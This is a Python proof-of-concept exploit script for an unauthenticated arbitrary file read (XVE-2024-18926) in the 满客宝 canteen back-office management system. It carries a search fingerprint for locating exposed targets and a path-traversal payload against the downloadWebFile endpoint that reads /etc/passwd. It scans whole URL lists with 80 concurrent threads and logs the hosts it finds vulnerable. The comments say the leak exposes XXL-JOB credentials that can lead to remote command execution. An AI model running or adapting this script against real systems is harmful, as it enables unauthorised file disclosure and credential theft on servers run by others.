# 满客宝后台管理系统 downloadWebFile 任意文件读取漏洞(XVE-2024-18926)
# body="满客宝后台管理系统"
# 产品简介:满客宝后台管理系统由正奇晟业（北京）科技有限公司开发，满客宝智慧食堂系统的重要组成部分，它为餐饮管理者提供了一个全面的、智能化的管理平台。该系统集成了用户管理、消费限制、菜谱管理、卡务管理、进销存管理、数据统计、互动中心、食品安全、食堂环境监测、后厨行为检测、就餐客流量统计、集团管控等多种功能，旨在帮助餐饮管理者实现精细化运营，提升服务质量和管理效率。
# 漏洞概述:满客宝后台管理系统 downloadWebFile 接口存在存在任意文件读取漏洞，未经身份验证的远程攻击者可通过该漏洞读取系统配置文件，获取XXL-JOB账户密码，若XXL-JOB部署在公网，可能会进一步导致后台远程命令执行。
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
\x1b[38m██╗  ██╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗       ██╗ █████╗  █████╗ ██████╗  ██████╗ 
\x1b[36m╚██╗██╔╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║      ███║██╔══██╗██╔══██╗╚════██╗██╔════╝ 
\x1b[34m ╚███╔╝ ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗╚██║╚█████╔╝╚██████║ █████╔╝███████╗ 
\x1b[35m ██╔██╗ ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝ ██║██╔══██╗ ╚═══██║██╔═══╝ ██╔═══██╗
\x1b[31m██╔╝ ██╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║       ██║╚█████╔╝ █████╔╝███████╗╚██████╔╝
\x1b[33m╚═╝  ╚═╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝       ╚═╝ ╚════╝  ╚════╝ ╚══════╝ ╚═════╝ 
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
           --author:Kucei  --Version:满客宝后台管理系统 downloadWebFile 任意文件读取漏洞(XVE-2024-18926)
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('XVE-2024-18926')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/base/api/v1/kitchenVideo/downloadWebFile.swagger?fileName=&ossKey=/../../../../../../../../../../../etc/passwd'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'Connection': 'close',
    }
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    data = {}
    try :
        response = requests.get(url=target+url_payload,headers=headers,verify=False,timeout=5)
        # print(response.status_code)
        # print(response.text)
        if response.status_code == 200 and ':0:0:' in response.text:
            print( f"[+] {target} 存在漏洞！\n")
            with open('XVE-2024-18926.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")


if __name__ == '__main__':
    main()